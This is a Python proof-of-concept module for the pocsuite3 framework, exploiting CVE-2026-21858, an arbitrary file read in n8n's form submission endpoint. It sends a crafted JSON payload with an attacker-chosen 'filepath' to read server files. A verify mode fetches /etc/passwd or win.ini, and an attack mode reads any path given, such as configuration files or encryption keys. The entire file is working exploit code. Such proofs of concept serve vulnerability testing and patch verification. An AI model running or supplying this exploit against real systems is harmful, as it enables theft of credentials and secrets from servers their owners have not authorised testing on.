#!/usr/bin/env python3
"""
CVE-2026-21858 - n8n Arbitrary File Read Vulnerability PoC

This PoC verifies the arbitrary file read vulnerability in n8n workflow automation platform.
The vulnerability exists in the form submission endpoint which allows attackers to read
arbitrary files from the server through path traversal in the file upload handler.

Author: POCsuite3 adaptation
References:
- https://github.com/Chocapikk/CVE-2026-21858
- CVE-2026-21858
"""

import secrets
import string
from collections import OrderedDict
from pocsuite3.api import (
    Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY
)
from pocsuite3.lib.core.interpreter_option import OptString


def randstr(n: int = 12) -> str:
    """Generate random string for unique identifiers"""
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


class CVE20262158LFIPOC(POCBase):
    """PoC for CVE-2026-21858 - n8n Arbitrary File Read"""

    pocInfo = {
        'name': 'CVE-2026-21858 n8n Arbitrary File Read',
        'vulID': 'CVE-2026-21858',
        'author': 'POCsuite3 adaptation',
        'vulType': VUL_TYPE.ARBITRARY_FILE_READ,
        'category': POC_CATEGORY.EXPLOITS.WEBAPP,
        'version': '1.0',
        'references': [
            'https://github.com/Chocapikk/CVE-2026-21858',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-21858'
        ],
        'appName': 'n8n',
        'appVersion': '< 1.121.0',
        'desc': '''
        n8n workflow automation platform is vulnerable to arbitrary file read through the
        form submission endpoint. Attackers can read sensitive files including configuration
        files, encryption keys, and database files by sending crafted POST requests to
        vulnerable form endpoints.
        ''',
        'install_requires': ['requests>=2.20.0']
    }

    def _options(self):
        """Define options for this PoC"""
        opt = OrderedDict()
        opt["form_path"] = OptString(
            "/form/form",
            description="Form submission endpoint path",
            require=False
        )
        opt["file_path"] = OptString(
            "",
            description="File path to read in attack mode (required for attack mode, e.g., /etc/passwd)",
            require=False
        )
        return opt

    def _build_lfi_payload(self, filepath: str) -> dict:
        """Build LFI payload for file read"""
        return {
            "data": {},
            "files": {
                f"f-{randstr(6)}": {
                    "filepath": filepath,
                    "originalFilename": f"{randstr(8)}.bin",
                    "mimetype": "application/octet-stream",
                    "size": secrets.randbelow(90000) + 10000
                }
            }
        }

    def read_file(self, form_url: str, filepath: str) -> tuple[bool, bytes | None]:
        """
        Attempt to read a file from the target server

        Args:
            form_url: The vulnerable form endpoint URL
            filepath: Path to the file to read

        Returns:
            Tuple of (success, content)
        """
        try:
            payload = self._build_lfi_payload(filepath)
            logger.debug(f"Sending payload to {form_url}")
            logger.debug(f"Target file: {filepath}")

            # Use longer timeout for large files
            timeout = 60 if filepath.startswith('/proc/') else 30

            resp = requests.post(
                form_url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=timeout
            )

            logger.debug(f"Response status: {resp.status_code}")
            logger.debug(f"Response content length: {len(resp.content) if resp.content else 0}")

            # Check if response is successful (2xx status) and has content
            if resp.ok and resp.content:
                logger.debug(f"Successfully read {len(resp.content)} bytes")
                return True, resp.content

            # Log why it failed
            if not resp.ok:
                logger.warning(f"HTTP request failed with status {resp.status_code}")
            if not resp.content:
                logger.warning("Response content is empty")

            return False, None

        except requests.exceptions.ConnectionError as e:
            logger.error(f"Connection error: {str(e)}")
            logger.info("The target may be unreachable, the form path may be incorrect, or the server closed the connection")
            logger.info("Try: 1) Check if target URL is correct")
            logger.info("     2) Verify form_path with --options parameter")
            logger.info("     3) Try a smaller file first (e.g., /etc/hostname)")
            return False, None
        except requests.exceptions.Timeout as e:
            logger.error(f"Timeout while reading file: {str(e)}")
            logger.info("The file may be too large or the server is slow to respond")
            return False, None
        except Exception as e:
            logger.error(f"Failed to read file: {str(e)}")
            return False, None

    def _verify(self):
        """
        Verify mode: Check if the target is vulnerable by reading /etc/passwd
        """
        output = Output(self)

        # Get form path from options, default to common paths
        form_path = self.get_option("form_path")
        if not form_path:
            form_path = "/form/form"

        form_url = f"{self.url.rstrip('/')}/{form_path.lstrip('/')}"

        logger.info(f"Testing form endpoint: {form_url}")

        # Try to read /etc/passwd on Linux systems
        success, content = self.read_file(form_url, "/etc/passwd")

        if success and content:
            # Check if it looks like /etc/passwd
            try:
                content_str = content.decode('utf-8', errors='ignore')
                logger.debug(f"File content preview: {content_str[:100]}")

                # Check for /etc/passwd characteristics
                if 'root:' in content_str and ('/bin/' in content_str or '/usr/' in content_str or '/home/' in content_str):
                    logger.info("Target is vulnerable to CVE-2026-21858!")
                    result = {
                        'VerifyInfo': {
                            'URL': self.url,
                            'FormPath': form_path,
                            'VulType': 'Arbitrary File Read',
                            'Payload': '/etc/passwd'
                        },
                        'Extra': {
                            'evidence': content_str[:200] + "..." if len(content_str) > 200 else content_str
                        }
                    }
                    output.success(result)
                    return output
                else:
                    logger.warning("File read succeeded but content doesn't match expected format")
                    logger.debug(f"Content preview: {content_str[:200]}")
            except Exception as e:
                logger.debug(f"Failed to parse content: {str(e)}")
        else:
            logger.info("Failed to read /etc/passwd, trying Windows file win.ini")
            # Try Windows file as fallback
            success, content = self.read_file(form_url, "C:\\windows\\win.ini")
            if success and content:
                try:
                    content_str = content.decode('utf-8', errors='ignore')
                    logger.debug(f"File content preview: {content_str[:100]}")

                    # Check for win.ini characteristics
                    if '[fonts]' in content_str.lower() or '[extensions]' in content_str.lower():
                        logger.info("Target is vulnerable to CVE-2026-21858 (Windows)!")
                        result = {
                            'VerifyInfo': {
                                'URL': self.url,
                                'FormPath': form_path,
                                'VulType': 'Arbitrary File Read',
                                'Payload': 'C:\\windows\\win.ini'
                            },
                            'Extra': {
                                'evidence': content_str[:200] + "..." if len(content_str) > 200 else content_str
                            }
                        }
                        output.success(result)
                        return output
                except Exception as e:
                    logger.debug(f"Failed to parse Windows file content: {str(e)}")

        output.fail("Target is not vulnerable")
        return output

    def _attack(self):
        """
        Attack mode: Read a specific file specified by user
        """
        output = Output(self)

        # Get file path from options
        filepath = self.get_option("file_path")
        if not filepath:
            logger.error("Please specify file_path using --options")
            output.fail("file_path option is required in attack mode")
            return output

        form_path = self.get_option("form_path")
        if not form_path:
            form_path = "/form/form"

        form_url = f"{self.url.rstrip('/')}/{form_path.lstrip('/')}"

        logger.info(f"Attempting to read: {filepath}")

        success, content = self.read_file(form_url, filepath)

        if success and content:
            logger.info(f"Successfully read {len(content)} bytes")
            result = {
                'FileInfo': {
                    'FilePath': filepath,
                    'FileSize': len(content)
                }
            }

            try:
                content_str = content.decode('utf-8', errors='ignore')
                result['Extra'] = {
                    'content': content_str,
                    'evidence': content_str[:500] + "..." if len(content_str) > 500 else content_str
                }
            except:
                result['Extra'] = {
                    'content': f"[Binary data: {len(content)} bytes]"
                }

            output.success(result)
            return output

        output.fail(f"Failed to read file: {filepath}")
        return output


register_poc(CVE20262158LFIPOC)
